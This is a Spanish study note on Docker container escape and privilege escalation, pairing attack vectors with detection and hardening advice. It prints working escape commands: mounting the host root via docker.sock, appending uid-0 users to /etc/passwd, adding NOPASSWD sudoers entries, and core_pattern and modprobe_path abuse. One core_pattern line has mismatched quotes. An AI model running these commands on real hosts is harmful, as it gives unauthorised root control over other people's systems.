---
aliases:
  - Docker Escape
  - Docker PrivEsc
  - Escape de Contenedores
tags:
  - sec/priv-esc
  - sec/docker
  - sec/linux
tipo: concepto
estado: terminado
creado: 2026-10-11
actualizado: 2026-10-11
relacionado:
  - "[[Grupos de Linux y Escalada de Privilegios]]"
  - "[[Linux Capabilities]]"
  - "[[Privilegios SUID en Linux]]"
  - "[[Vulnerabilidades del Kernel y Escalada de Privilegios]]"
  - "[[Abuso de Permisos en Linux y LSE]]"
  - "[[Docker - Fundamentos y Conceptos]]"
  - "[[Docker - Gestión de Contenedores]]"
  - "[[Comandos Básicos de Sistema y Red en Linux]]"
fuente: "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security.html"
---

# Abuso de Docker para Escalada de Privilegios y Escape de Contenedores

**Docker** no es una máquina virtual: un contenedor es un proceso normal del host con un juego de *namespaces*, *cgroups* y *capabilities* recortados. Ese modelo es la clave de todo lo que sigue — si la configuración le devuelve al contenedor cualquiera de esas palancas (socket, `--privileged`, `CAP_SYS_ADMIN`, bind mounts), la frontera contenedor↔host deja de existir y el atacante obtiene **root en el host**.

> [!info] Por qué un contenedor comprometido escala tanto
> En esta clase exploraremos diversas técnicas para abusar de Docker con el objetivo de elevar nuestros privilegios de usuario y escapar del contenedor hacia la máquina host. Examinaremos situaciones específicas y discutiremos las implicaciones de seguridad en cada caso. El principio que las une: Docker es una plataforma que permite empaquetar aplicaciones y sus dependencias en unidades aisladas, pero **una configuración incorrecta o la exposición de funcionalidades privilegiadas pueden convertirlo en un vector crítico** para la escalada de privilegios y el escape a la máquina anfitriona, debido a que los contenedores comparten el kernel del host y, en ciertos escenarios, recursos críticos del sistema.

## Mecánica: qué aísla realmente un contenedor

| Mecanismo | Qué hace | Qué pasa si se relaja |
|---|---|---|
| **Namespaces** (`mnt`, `pid`, `net`, `uts`, `ipc`, `user`, `cgroup`) | Oculta/aisla vistas del sistema: procesos, montajes, red, hostname | `--pid=host`, `--net=host`, `--mnt` compartido → el contenedor ve el host |
| **cgroups** | Limita CPU/memoria/pids de los procesos del contenedor | `--privileged` permite reescribir el controlador y usar `release_agent` (escape ver más abajo) |
| **Capabilities** (`capset`) | Sustituye el bit "soy root" por permisos granulares: `CAP_SYS_ADMIN`, `CAP_NET_RAW`, `CAP_DAC_OVERRIDE`… | `--privileged` otorga **todas**; `--cap-add=SYS_ADMIN` basta para montar y escapar |
| **seccomp** | Filtro de syscalls: bloquea ~44 syscalls peligrosas (`mount`, `ptrace` parcial, `reboot`…) | `--security-opt seccomp=unconfined` desactiva el filtro |
| **AppArmor / SELinux** | MAC sobre qué archivos/dispositivos puede tocar el proceso | `--security-opt apparmor=unconfined` lo desactiva |
| **user namespace** (`rootless`, `userns-remap`) | Mapea el uid 0 del contenedor a un uid no privilegiado del host | Sin él, "root del contenedor" = root real del host en cuanto hay una palanca |

> [!tip] Regla mnemotécnica del escape
> **Root en el contenedor no es root en el host… hasta que recuperas una capacidad del host.** Toda técnica de esta nota es una forma distinta de recuperar: acceso al socket, acceso a dispositivos, capacidad `SYS_ADMIN`, o escritura directa en el FS del host.

## Enumeración: cómo saber desde dentro que el escape es posible

```bash
# 1. ¿Estoy en un contenedor?
ls -la /.dockerenv 2>/dev/null; grep -E '(docker|containerd|kubepods)' /proc/1/cgroup
cat /proc/1/environ | tr '\0' '\n' | grep -i -E 'docker|kubernetes'

# 2. Capabilities disponibles (la pregunta clave)
cat /proc/self/status | grep Cap
capsh --decode=$(grep CapEff /proc/self/status | awk '{print $2}')   # si está instalado

# 3. ¿Puedo hablar con el demonio Docker?
ls -la /var/run/docker.sock 2>/dev/null
curl -s --unix-socket /var/run/docker.sock http://localhost/version
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json

# 4. Monturas y modo privilegiado
mount | grep -E 'on / |/dev/sd'        # ¿el FS raíz del host aparece montado?
cat /proc/self/status | grep -i seccomp  # 0 = unconfined
cat /proc/self/attr/current              # perfil AppArmor activo

# 5. Dispositivos de bloque expuestos (para montar el disco del host)
ls -la /dev/sd* /dev/vd* /dev/xda* 2>/dev/null
```

## Vector 1: acceso al socket de Docker (grupo `docker` o `docker.sock` montado)

El socket `/var/run/docker.sock` es una **API de root**: quien habla con él, crea contenedores con cualquier bind mount y ejecuta lo que quiera en el host. Puede aparecer por dos vías:

1. El usuario pertenece al grupo `docker` (ver [[Grupos de Linux y Escalada de Privilegios]]).
2. El socket está montado en el contenedor (sidecar, CI, `portainer`).

```bash
# Prueba de acceso
docker -H unix:///var/run/docker.sock ps          # o simplemente: docker ps

# Escalada: montar la raíz del host y chroot
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# dentro del chroot:
cat /mnt/etc/shadow 2>/dev/null || cat /etc/shadow
echo 'root2:$6$....:0:0:root:/root:/bin/bash' >> /etc/passwd   # usuario nuevo uid 0

# Variante sin chroot: edición directa con bind mount
docker run -v /etc:/host_etc -it ubuntu bash
echo 'usuario ALL=(ALL) NOPASSWD:ALL' >> /host_etc/sudoers.d/pwn
```

```bash
# Variante por API HTTP sin binario docker instalado
curl -s --unix-socket /var/run/docker.sock \
  -X POST -H 'Content-Type: application/json' \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Entrypoint":["/bin/sh","-c"], ...}' \
  http://localhost/containers/create
```

## Vector 2: bind mounts controlados por el atacante

> [!tip] Monturas de volumen (`bind mounts`)
> Las monturas permiten que un contenedor acceda directamente a un directorio o archivo del sistema de archivos del host. Si un atacante puede controlar la creación de contenedores y especificar una montura a un directorio sensible como `/etc`, `/root` o incluso el directorio raíz `/`, puede leer, modificar o sobrescribir archivos críticos del sistema host. Por ejemplo, montar `/etc` permite modificar `/etc/passwd` o `/etc/shadow` para crear nuevos usuarios o cambiar contraseñas.
>
> **Ejemplo de comando vulnerable:**
> ```bash
> docker run -v /:/mnt/host_root -it ubuntu bash
> ```
> Una vez dentro del contenedor, el atacante puede acceder al sistema de archivos del host en `/mnt/host_root` y realizar acciones como:
> ```bash
> echo 'root:newpasswordhash:0:0:root:/root:/bin/bash' >> /mnt/host_root/etc/passwd
> ```

Variantes de impacto según lo que se monte:

| Montura | Impacto desde el contenedor |
|---|---|
| `-v /:/mnt` | Control total del FS host: usuarios, SSH keys, crons, binarios SUID |
| `-v /etc:/x` | Editar `passwd`, `shadow`, `sudoers`, claves de servicio |
| `-v /var/run/docker.sock:/var/run/docker.sock` | Volver al Vector 1 (escape recursivo) |
| `-v /proc/sys:/x` (ro→rw) | Escribir `core_pattern` / `modprobe_path` → ejecución como root al provocar un crash |
| `-v ~/.ssh:/root/.ssh` | Robar/inyectar claves SSH del host |

> [!warning] Mounts que parecen inofensivos
> Un volumen declarado en `docker-compose.yml` como `./config:/etc/app` puede convertirse en `/etc:/etc` si alguien edita la ruta con permisos. Revisá siempre `docker inspect <ctr> --format '{{json .Mounts}}'` — la lista de mounts es el primer artefacto a auditar.

## Vector 3: `--privileged` y `--pid=host`

> [!warning] Compartición de procesos y permisos privilegiados
> La opción `--pid=host` permite que el contenedor comparta el espacio de nombres de PID del host, lo que significa que los procesos dentro del contenedor pueden ver y manipular los procesos del host. Combinado con `--privileged`, que otorga al contenedor todas las capacidades de Linux y acceso a dispositivos del host, un atacante puede realizar operaciones altamente intrusivas. Por ejemplo, puede usar `ptrace` para inyectar código en procesos del host que se ejecutan con privilegios de `root`.
>
> **Ejemplo de comando vulnerable:**
> ```bash
> docker run --pid=host --privileged -it ubuntu bash
> ```
> Dentro del contenedor, un atacante podría listar procesos del host (`ps aux`) e intentar inyectar código en un proceso `root` utilizando herramientas como `gdb` o `pwn_ptrace`.

Con `--privileged` el contenedor recibe **todas las capabilities** y acceso a **todos los dispositivos**, lo que habilita por sí solo varias rutas de escape:

```bash
# a) Montar el disco real del host (mismos devices expuestos)
fdisk -l                          # identificar el disco, p. ej. /dev/sda1
mount /dev/sda1 /mnt              # FS host montado dentro del contenedor
chroot /mnt bash                  # root real sobre el host

# b) Escape vía cgroup release_agent (funciona también con solo CAP_SYS_ADMIN)
#    Inyectar en un cgroup del host y usar release_agent para ejecutar un binario
#    propio con privilegios de root cuando el cgroup se vacía.
dmesg | grep -i cgroup            # confirmar controlador legacy (v1) disponible
# (procedimiento completo en HackTricks → "Escape from privileged container")

# c) ptrace sobre procesos del host (requiere --pid=host y ptrace sin restricción)
ps aux | grep -E 'sshd|systemd'
gdb -p <PID_host>                 # inyectar shellcode / cambiar register set
```

> [!warning] `release_agent` solo funciona con cgroups v1
> En distros modernos con cgroups v2 (unified hierarchy, ver `stat -fc %T /sys/fs/cgroup/` → `cgroup2fs`) la ruta `release_agent` **no existe**. Ahí el escape privilegiado pasa por montar el disco, `core_pattern` o `modprobe_path`.

## Vector 4: `CAP_SYS_ADMIN` sin `--privileged`

Basta **una capability** para varios escapes. `capsh --print` dentro del contenedor muestra si está presente:

```bash
# Escape mínimo con CAP_SYS_ADMIN: montar el disco del host
mount -t proc proc /proc          # a veces necesario para re-leer namespaces
mkdir /tmp/host && mount /dev/sda1 /tmp/host

# Escape por core_pattern (escribir en /proc/sys/kernel/core_pattern)
echo '|/tmp/pwn.sh %p %e" > /proc/sys/kernel/core_pattern
# provocar un crash (p. ej. un kill -SEGV de un proceso propio) => pwn.sh corre como root

# Escape por modprobe_path
echo -e '#!/bin/sh\nchmod u+s /bin/bash' > /tmp/x
echo /tmp/x > /proc/sys/kernel/modprobe
# disparar llamada a formato desconocido: socket -f 99 o un .bin con header inválido
```

```bash
# Verificación de la capability efectiva
grep CapEff /proc/self/status
# 0000003fffffffff => todas (privilegiado); bit de CAP_SYS_ADMIN = bit 21
```

La tabla completa de números de capability y su abuso directo está en [[Linux Capabilities]].

## Vector 5: seccomp / AppArmor desactivados

```bash
# Diagnóstico
grep Seccomp /proc/self/status     # 2 = filtrado activo, 0 = unconfined
cat /proc/self/attr/current        # "docker-default" vs "unconfined"
```

- `seccomp=unconfined` permite syscalls como `ptrace` completas, `mount`, `reboot`, `kexec_load` — desbloquea los escapes de los vectores 3 y 4 que el perfil por defecto bloquea.
- `apparmor=unconfined` levanta la restricción sobre rutas de archivos y dispositivos (combo clásico en Kubernetes con perfiles `unconfined`).
- **No es escape por sí solo**: sin una palanca adicional (dispositivo, capability, mount) solo amplía el menú de syscalls. Por eso se audita **junto** con los vectores anteriores.

## Vector 6: Docker-in-Docker (DinD) y sockets anidados

En CI (GitLab runners, imágenes `docker:dind`) el socket anidado permite crear contenedores **desde dentro de un contenedor**, con lo que el atacante repite cualquier vector de esta nota contra el host real:

```bash
# El daemon DinD suele escuchar en tcp://2375 sin TLS
curl http://localhost:2375/version
export DOCKER_HOST=tcp://localhost:2375
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

> [!warning] `tcp://2375` sin TLS es root remoto
> Un daemon Docker expuesto en `0.0.0.0:2375` sin TLS equivale a **shell root sin autenticación** para cualquiera que llegue a ese puerto. El puerto 2376 (TLS) es el estándar para exposición.

## Vector 7: Portainer (y cualquier UI/panel de gestión)

> [!info] Uso de Portainer para administrar el despliegue de contenedores
> Portainer es una interfaz de usuario gráfica para gestionar entornos Docker. Si un atacante obtiene acceso a la interfaz de Portainer (por ejemplo, a través de credenciales comprometidas o una vulnerabilidad web), puede crear y desplegar contenedores con configuraciones arbitrarias, incluyendo `bind mounts` o el modo `--privileged`. Esto le permite realizar las mismas técnicas de escape y escalada de privilegios que si tuviera acceso directo al demonio Docker.
>
> **Escenario de ataque:** un atacante con acceso a Portainer navega a *Containers → Add container*, define la imagen `ubuntu`, el host path `/` montado en `/mnt` (o marca *Privileged*) y arranca una shell interactiva. En un minuto obtiene una terminal de root sobre el host.

Implicación defensiva: **cualquier panel que pueda crear contenedores (Portainer, Docker UI, Cockpit, Rancher) es funcionalmente equivalente a pertenecer al grupo `docker`** — su superficie de autenticación debe tratarse como nivel root (MFA, cuentas dedicadas, auditoría).

## Catálogo resumido de vectores y mitigación

| Vector | Requisito | Escape resultante | Mitigación clave |
|---|---|---|---|
| Socket `docker.sock` | grupo `docker` o mount del socket | root en host vía `-v /:/mnt` | no añadir usuarios al grupo; `chmod 660` + auditoría |
| Bind mount peligroso | permiso de `run`/`create` | escritura directa en FS host | políticas de admission; prohibir mounts en `/` |
| `--privileged` | permiso de `run` con flags | todas las capabilities + devices | denegar por defecto; auditd sobre `docker run` |
| `--pid=host` | idem | ptrace a procesos host | denegar `--pid=host` |
| `CAP_SYS_ADMIN` | `--cap-add` | mount, `core_pattern`, `release_agent` | `cap-drop=ALL` + add mínimas |
| seccomp/AppArmor off | `--security-opt` | habilita escapes de syscall | mantener perfiles por defecto |
| DinD / `:2375` | daemon expuesto | root remoto | TLS obligatorio, red interna |
| Portainer/UI | sesión válida | cualquier vector de la tabla | MFA, RBAC, auditoría |

## Detección (qué mira el defensor)

```bash
# Eventos de Docker: creación de contenedores con flags peligrosos
docker events --filter event=create --since 24h
docker ps -a --format '{{.Names}} {{.Command}}' | grep -E 'privileged|--pid|/var/run/docker.sock'

# auditd: quién tocó el socket o lanzó docker run
auditctl -w /var/run/docker.sock -p rwxa -k docker_sock
auditctl -w /usr/bin/docker -p x -k docker_exec

# Logs: contenedores montando la raíz del host
grep -R -- '-v /:' /var/lib/docker/containers/*/*-config.json
journalctl -u docker --since today | grep -iE 'privileged|host pid'
```

Artefactos forenses: JSON de config de cada contenedor en `/var/lib/docker/containers/<id>/hostconfig.json` (guarda `Privileged`, `Binds`, `PidMode`), imagen y capas creadas, entradas en `auth.log` si el acceso fue por SSH+grupo docker.

## Sección defensiva: endurecimiento

```bash
# 1. El grupo docker es root equivalente — auditarlo
getent group docker
grep -R docker /etc/group /etc/sudoers /etc/sudoers.d/

# 2. Rootless Docker / remap de usuario (nobody real detrás del root del contenedor)
#    /etc/docker/daemon.json
{ "userns-remap": "default" }

# 3. Restricciones por daemon (aplicables con Docker Swarm o herramientas de política)
{ "no-new-privileges": true,
  "icc": false,
  "log-driver": "json-file",
  "live-restore": true }

# 4. Arranque de contenedores con la mínima superficie
docker run --read-only --cap-drop ALL --cap-add NET_BIND_SERVICE \
  --security-opt no-new-privileges:true --security-opt seccomp=default \
  --pids-limit 100 --memory 256m imagen

# 5. Cerrar el socket TCP y TLS en 2376
#    Arranque del daemon: dockerd --tlsverify --tlscacert=ca.pem \
#      --tlscert=server-cert.pem --tlskey=server-key.pem -H fd://

# 6. K8s: Pod Security Admission (restricted) prohíbe privileged/hostPID/hostNetwork
kubectl get pods -A -o json | jq '.items[] | select(.spec.securityContext.privileged==true)'
```

Reglas de oro: **ningún usuario no raíz en el grupo `docker`**, sockets con `660 root:docker`, políticas que prohíban `--privileged`/`--pid=host`/mounts de `/`, y monitorización de la creación de contenedores como si fuera ejecución de binarios nuevos.

## Errores comunes

1. **Asumir "el contenedor está aislado, dentro soy root pero inofensivo"** — root en el contenedor con `CAP_DAC_OVERRIDE` ya puede leer monturas compartidas; con el socket, ya es root del host.
2. **Buscar `/ .dockerenv` como única prueba de contenedor** — puede no existir (podman, builds); usar `/proc/1/cgroup` y `mount` como fuente de verdad.
3. **Confundir escape por cgroups v1 con v2** — `release_agent` no existe en v2; verificar con `stat -fc %T /sys/fs/cgroup/` antes de invertir tiempo.
4. **Creer que `--read-only` impide escapes** — solo protege el FS interno; el socket, los dispositivos y los mounts siguen siendo la superficie real.
5. **False positive en enumeración**: `grep docker /proc/1/cgroup` puede aparecer también en hosts con nombres de cgroup heredados; confirmar con `ls /.dockerenv` + `mount` + entorno.
6. **Olvidar que Portainer/CI con credenciales Docker equivalen a root** — no es "solo una UI".

## Cheatsheet

```bash
# ¿escape posible?
ls /.dockerenv; grep -E 'docker|kubepods' /proc/1/cgroup
capsh --print 2>/dev/null || grep CapEff /proc/self/status
ls -la /var/run/docker.sock; mount; grep Seccomp /proc/self/status

# Ruta socket → root
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
docker run -v /etc:/x -it ubuntu bash

# Ruta privilegiado → disco host
fdisk -l; mount /dev/sda1 /mnt; chroot /mnt bash

# Ruta SYS_ADMIN → core_pattern / modprobe_path
echo '|/tmp/pwn.sh' > /proc/sys/kernel/core_pattern
echo /tmp/x > /proc/sys/kernel/modprobe

# Endurecimiento
getent group docker; cat /etc/docker/daemon.json   # userns-remap, no-new-privileges
docker run --cap-drop ALL --security-opt no-new-privileges:true --read-only IMG
```

## Errores comunes de hardening / falsos positivos

- `chmod 660 /var/run/docker.sock` **no basta** si el usuario sigue en el grupo `docker`: el grupo es la autorización.
- `userns-remap` desactiva compatibilidad con volúmenes que esperan uid 0 — testear antes de desplegar.
- Restringir `docker run` por sudoers pero dejar `podman`/`nerdctl` instalados = salida lateral.

## Referencias

- HackTricks — *Docker Security / Escape from privileged container*: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security.html
- GTFOBins (binarios abusables dentro de contenedores): https://gtfobins.github.io/
- PayloadsAllTheThings — *Container escapes*: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources
- Docker docs — * security options, rootless, daemon TLS*: https://docs.docker.com/engine/security/
- Kubernetes Pod Security Standards: https://kubernetes.io/docs/concepts/security/pod-security-standards/
- Notas internas: [[Grupos de Linux y Escalada de Privilegios]] (grupo `docker`), [[Linux Capabilities]], [[Docker - Fundamentos y Conceptos]], [[Docker - Gestión de Contenedores]], [[Vulnerabilidades del Kernel y Escalada de Privilegios]]

## Relacionadas

- [[Grupos de Linux y Escalada de Privilegios]] — el grupo `docker` como vector de entrada
- [[Linux Capabilities]] — números, `capsh`, explotación directa
- [[Abuso de Permisos en Linux y LSE]] — enumeración previa dentro del contenedor
- [[Privilegios SUID en Linux]] — binarios SUID como objetivo alternativo al escape
- [[Comandos Básicos de Sistema y Red en Linux]] — `mount`, `ps`, `netstat` de apoyo
